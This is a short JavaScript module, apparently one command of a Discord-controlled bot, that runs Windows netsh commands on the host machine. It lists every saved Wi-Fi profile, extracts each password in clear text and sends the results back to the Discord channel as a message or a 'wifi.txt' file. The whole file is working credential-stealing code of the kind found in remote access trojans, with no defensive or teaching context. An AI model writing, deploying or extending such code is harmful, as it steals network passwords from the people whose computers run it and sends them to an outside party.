const { exec } = require('child_process');
const { EmbedBuilder } = require('discord.js');
const { sendFileOrEmbed } = require('./utils');

module.exports = {
  name: 'wifi',
  execute(msg) {
    exec('netsh wlan show profiles', (err, stdout) => {
      if (err)
        return msg.reply({ embeds: [new EmbedBuilder().setColor(0xff0000).setDescription('❌ Could not list Wi-Fi profiles.')] });
      const profiles = stdout.split('\n')
        .map(line => (line.match(/All User Profile\s*:\s*(.*)/) || [])[1])
        .filter(Boolean);
      if (!profiles.length)
        return msg.reply({ embeds: [new EmbedBuilder().setColor(0xff0000).setDescription('❌ No Wi-Fi profiles found.')] });
      let results = '', done = 0;
      profiles.forEach(profile => {
        exec(`netsh wlan show profile name="${profile}" key=clear`, (err, stdout) => {
          results += `\n===== ${profile} =====\n`;
          results += err
            ? 'Error retrieving password.\n'
            : ((stdout.match(/Key Content\s*:\s*(.*)/) || [])[1]
              ? `Password: ${(stdout.match(/Key Content\s*:\s*(.*)/) || [])[1]}\n`
              : 'Password: Not found or not stored.\n');
          if (++done === profiles.length)
            sendFileOrEmbed(msg, '📶 Wi-Fi Passwords', results.trim(), 'wifi.txt');
        });
      });
    });
  }
};